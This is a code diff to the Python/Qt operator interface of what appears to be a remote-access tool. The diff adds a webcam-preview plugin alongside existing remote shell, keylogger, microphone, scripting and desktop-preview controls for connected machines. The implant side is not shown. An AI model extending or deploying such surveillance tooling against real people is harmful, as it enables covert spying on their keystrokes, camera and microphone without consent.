@@ -30,6 +30,7 @@ from plugins.mkeylogger import main as mkeylogger
 from plugins.mprocesses import main as mprocesses
 from plugins.mscript import main as mscript
 from plugins.mdesktop import main as mdesktop
+from plugins.mwebcam import main as mwebcam
 
 
 # initial geo ip database
@@ -103,7 +104,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionDesktop_Preview.setDisabled(True)
         self.actionWebcam_Preview.setDisabled(True)
         self.actionLock_Client.setDisabled(True)
-        #self.lockServerButton.setVisible(False)
+        # self.lockServerButton.setVisible(False)
         self.actionStop_Client.setDisabled(True)
         self.actionUnlock_Client.setDisabled(True)
 
@@ -140,9 +141,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionClient_Configuration.triggered.connect(self.run_settings)
 
         # Panel Triggers
-        #self.updatePreviewButton.triggered.connect(self.get_desktop_preview)
-        #self.getWebcamButton.triggered.connect(self.get_webcam_preview)
-        #self.screenSaveButton.triggered.connect(self.save_preview)
         self.actionUnlock_Client.triggered.connect(self.unlock_client)
         self.actionLock_Client.triggered.connect(self.lock_client)
         self.actionStop_Client.triggered.connect(self.terminate_client)
@@ -157,6 +155,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
         ###
         self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
+        self.actionWebcam_Preview.triggered.connect(self.get_webcam_preview)
 
         # menu triggers
         self.actionStartListen_for_connections.triggered.connect(self.listen_start)
@@ -331,32 +330,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 'ipAddress': self.socks[server]['ip_address'],
                 'assets': assets,
             }
-            self.desktop = mdesktop.mainPopup(args)
-            self.desktop.show()
+            self.desktop_desktop_preview = mdesktop.mainPopup(args)
+            self.desktop_desktop_preview.show()
 
     def get_webcam_preview(self):
         server = self.current_client()
         if server:
-            webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
-            try:
-                webcam_info = ast.literal_eval(webcam_dict)
-                im = Image.fromstring('RGB', (int(webcam_info['width']), int(webcam_info['height'])),
-                                      zlib.decompress(webcam_info['webcambits']), 'raw', 'BGR', 0, -1)
-                webcam_bits = im.convert('RGBA')
-                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(webcam_bits)).scaled(
-                    self.previewLabel.size(), Qt.KeepAspectRatio))
-                self.deviceNameLabel.setText(self.socks[server]['webcamdevice'])
-                self.current_bits = webcam_bits
-                self.screenSaveButton.setDisabled(False)
-            except SyntaxError:
-                pass
-
-    def save_preview(self):
-        if self.current_bits:
-            file_name = QFileDialog.getSaveFileName(self, 'Save file', '', 'Image (*.png)')
-            windows_path = str(file_name).replace('/', '\\')
-            if file_name:
-                self.current_bits.save(windows_path, 'png')
+            args = {
+                'sock': self.socks[server]['sock'],
+                'socket': self.socks[server]['socket'],
+                'ipAddress': self.socks[server]['ip_address'],
+                'assets': assets,
+            }
+            self.camera_preview_dialog = mwebcam.mainPopup(args)
+            self.camera_preview_dialog.show()
 
     # Update Servers Table from self.socks
     def update_servers_table(self):
@@ -401,7 +388,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setText(privs_status)
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
-
                 # add server lock status
                 lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
                 item = QTableWidgetItem(lock_status)
@@ -412,7 +398,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     item.setTextColor(QColor('#2ecc71'))
                     item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                 self.serversTable.setItem(index, self.index_of_lock, item)
-
 
                 # add input device
                 item = QTableWidgetItem()
@@ -471,7 +456,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def update_main_menu(self):
         try:
             if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
-                #self.actionUnlock_Server.setVisible(True)
                 self.actionUnlock_Client.setDisabled(False)
                 self.actionSet_Alias.setDisabled(False)
                 self.actionRun_As_Admin.setDisabled(False)
@@ -479,14 +463,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 server = self.current_client()
                 if self.socks[server]['webcamdevice'] != 'NoDevice':
                     self.actionWebcam_Preview.setDisabled(False)
-
                 self.actionRemote_Shell.setDisabled(True)
                 self.actionRemote_Explorer.setDisabled(True)
                 self.actionRemote_Microphone.setDisabled(True)
                 self.actionRemote_Keylogger.setDisabled(True)
                 self.actionRemote_Scripting.setDisabled(True)
                 self.actionRemote_Process_Manager.setDisabled(True)
-                #self.actionLock_Server.setVisible(False)
                 self.actionLock_Client.setDisabled(True)
                 self.actionStop_Client.setDisabled(True)
             else:
@@ -497,10 +479,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.actionRemote_Keylogger.setDisabled(False)
                 self.actionRemote_Scripting.setDisabled(False)
                 self.actionRemote_Process_Manager.setDisabled(False)
-                #self.actionLock_Server.setVisible(True)
                 self.actionLock_Client.setDisabled(False)
                 self.actionStop_Client.setDisabled(False)
-                #self.unlockServerButton.setVisible(False)
                 self.actionUnlock_Client.setDisabled(True)
                 self.actionDesktop_Preview.setDisabled(False)
                 server = self.current_client()
@@ -513,16 +493,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.actionRemote_Microphone.setDisabled(True)
             self.actionRemote_Scripting.setDisabled(True)
             self.actionRemote_Process_Manager.setDisabled(True)
-            #self.actionLock_Server.setVisible(False)
             self.actionLock_Client.setDisabled(True)
             self.actionStop_Client.setDisabled(True)
             self.actionSet_Alias.setDisabled(True)
             self.actionRun_As_Admin.setDisabled(True)
-            #self.unlockServerButton.setVisible(True)
             self.actionUnlock_Client.setDisabled(True)
             self.actionDesktop_Preview.setDisabled(True)
             self.actionWebcam_Preview.setDisabled(True)
-            #self.screenSaveButton.setDisabled(True)
 
     def has_microphone(self):
         try:
@@ -533,6 +510,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         except AttributeError:
             warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
             warn.exec_()
+            return False
+
+    def has_camera(self):
+        server = self.current_client()
+        if self.socks[server]['webcamdevice'] != 'NoDevice':
+            return True
+        else:
             return False
 
     def server_right_click_menu(self, point):
@@ -555,7 +539,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
                                       lambda: self.run_plugin('processesMode'))
                 audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
-                                          lambda: self.run_plugin('audioMode'))
+                                                   lambda: self.run_plugin('audioMode'))
                 if not self.has_microphone():
                     audio_menu.setEnabled(False)
                 server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
@@ -576,6 +560,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
             server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
                                   'Desktop Preview', self.get_desktop_preview)
+            camera_menu = server_menu.addAction(QIcon(os.path.join(assets, 'webcam.png')),
+                                                'Camera Preview', self.get_webcam_preview)
+            if not self.has_camera():
+                camera_menu.setEnabled(False)
 
             server_menu.exec_(self.serversTable.mapToGlobal(point))
 
@@ -662,6 +650,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def closeEvent(self, event):
         sys.exit(1)
 
+
 def handle_exception(exc_type, exc_value, exc_traceback):
     if form:
         now = datetime.datetime.now()
@@ -688,6 +677,7 @@ DATE: %s/%s/%s %s:%s:%s
                exc_traceback)
         with open('error.log', 'a') as log_file:
             log_file.write(log_value)
+
 
 open('error.log', 'w').close()
 sys.excepthook = handle_exception
